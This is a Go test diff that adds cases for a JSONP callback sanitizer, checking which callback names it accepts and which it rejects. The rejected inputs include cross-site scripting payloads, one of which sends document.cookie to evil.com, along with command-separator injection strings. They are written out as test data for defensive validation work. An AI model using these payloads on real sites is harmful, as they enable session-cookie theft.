@@ -66,6 +66,34 @@ func TestFilterLeaves(t *testing.T) {
 	f([]string{"foo.", "bar."}, ".", []string{})
 }
 
+func TestSanitizeJSONP(t *testing.T) {
+	f := func(input, want string) {
+		t.Helper()
+		got := sanitizeJSONP(input)
+		if got != want {
+			t.Fatalf("sanitizeJSONP(%q) = %q; want %q", input, got, want)
+		}
+	}
+
+	f("", "")
+
+	// ok
+	f("callback", "callback")
+	f("_cb", "_cb")
+	f("$", "$")
+	f("jQuery", "jQuery")
+	f("jQuery.fn.jsonp", "jQuery.fn.jsonp")
+	f("jQuery18304567890", "jQuery18304567890")
+
+	// rejected
+	f("alert(document.cookie)//", "")
+	f("fetch('https://evil.com/?c='+document.cookie)//", "")
+	f("callback\ninjected", "")
+	f("callback;injected", "")
+	f("callback(", "")
+	f("a b", "")
+}
+
 func TestAddAutomaticVariants(t *testing.T) {
 	f := func(query, delimiter, resultExpected string) {
 		t.Helper()
